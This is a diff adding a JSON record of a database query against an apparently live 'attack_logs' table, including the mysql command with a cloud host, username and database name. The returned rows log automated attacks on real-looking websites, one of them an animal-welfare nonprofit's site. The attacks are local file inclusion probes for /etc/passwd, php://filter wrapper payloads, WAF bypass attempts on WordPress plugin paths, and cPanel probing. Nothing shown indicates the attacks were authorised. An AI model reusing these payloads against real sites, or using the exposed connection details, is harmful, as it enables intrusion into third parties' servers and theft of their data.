@@ -1,0 +1,31 @@
+{
+  "query": "SELECT COUNT(*) as total FROM attack_logs; SELECT * FROM attack_logs ORDER BY id DESC LIMIT 5;",
+  "command": "mysql --batch --raw --column-names --default-character-set=utf8mb4 --host gateway04.us-east-1.prod.aws.tidbcloud.com --port 4000 --user 3LsDtjPqt12uZuy.1287516f661f --database 5QWxsXug7WsY3BLQHWP3Uh --execute SELECT COUNT(*) as total FROM attack_logs; SELECT * FROM attack_logs ORDER BY id DESC LIMIT 5;",
+  "rows": [
+    {
+      "total": "3731"
+    },
+    {
+      "total": "id\tdeployId\tuserId\tlogDomain\tlogPhase\tlogStep\tlogDetail\tlogSeverity\tlogProgress\tlogData\tlogMethod\thttpStatus\tresponseTime\tlogTimestamp\tlogCreatedAt"
+    },
+    {
+      "total": "33358\tNULL\t0\thttps:\tindirect\tlfi\t💉 Testing LFI: ../../../../etc/passwd...\tinfo\t94\tNULL\tindirect_attack\tNULL\tNULL\t2026-03-09 16:05:19\t2026-03-09 16:06:32"
+    },
+    {
+      "total": "33357\tNULL\t0\thttps:\tindirect\tlfi\t💉 Testing LFI: php://filter/convert.base64-encode/resou...\tinfo\t94\tNULL\tindirect_attack\tNULL\tNULL\t2026-03-09 16:05:00\t2026-03-09 16:06:32"
+    },
+    {
+      "total": "33356\tNULL\t0\thttps:\twaf_bypass\tct_text_plain\t🛡️ Trying text/plain → /wp-content/plugins/\tinfo\t84\tNULL\twaf_bypass\tNULL\tNULL\t2026-03-09 16:04:57\t2026-03-09 16:06:32"
+    },
+    {
+      "total": "33355\tNULL\t0\thttps:\talt_upload\tcpanel\t📡 Checking cPanel at https://https://spayneuterspringfield.org/cpanel...\tinfo\t89\tNULL\talt_upload\tNULL\tNULL\t2026-03-09 16:04:55\t2026-03-09 16:06:32"
+    },
+    {
+      "total": "33354\tNULL\t0\thttps:\tindirect\tlfi\t💉 Testing LFI: php://filter/convert.base64-encode/resou...\tinfo\t94\tNULL\tindirect_attack\tNULL\tNULL\t2026-03-09 16:04:33\t2026-03-09 16:06:31"
+    }
+  ],
+  "messages": [],
+  "stdout": "total\n3731\nid\tdeployId\tuserId\tlogDomain\tlogPhase\tlogStep\tlogDetail\tlogSeverity\tlogProgress\tlogData\tlogMethod\thttpStatus\tresponseTime\tlogTimestamp\tlogCreatedAt\n33358\tNULL\t0\thttps:\tindirect\tlfi\t💉 Testing LFI: ../../../../etc/passwd...\tinfo\t94\tNULL\tindirect_attack\tNULL\tNULL\t2026-03-09 16:05:19\t2026-03-09 16:06:32\n33357\tNULL\t0\thttps:\tindirect\tlfi\t💉 Testing LFI: php://filter/convert.base64-encode/resou...\tinfo\t94\tNULL\tindirect_attack\tNULL\tNULL\t2026-03-09 16:05:00\t2026-03-09 16:06:32\n33356\tNULL\t0\thttps:\twaf_bypass\tct_text_plain\t🛡️ Trying text/plain → /wp-content/plugins/\tinfo\t84\tNULL\twaf_bypass\tNULL\tNULL\t2026-03-09 16:04:57\t2026-03-09 16:06:32\n33355\tNULL\t0\thttps:\talt_upload\tcpanel\t📡 Checking cPanel at https://https://spayneuterspringfield.org/cpanel...\tinfo\t89\tNULL\talt_upload\tNULL\tNULL\t2026-03-09 16:04:55\t2026-03-09 16:06:32\n33354\tNULL\t0\thttps:\tindirect\tlfi\t💉 Testing LFI: php://filter/convert.base64-encode/resou...\tinfo\t94\tNULL\tindirect_attack\tNULL\tNULL\t2026-03-09 16:04:33\t2026-03-09 16:06:31\n",
+  "stderr": "",
+  "execution_time_ms": 1808
+}
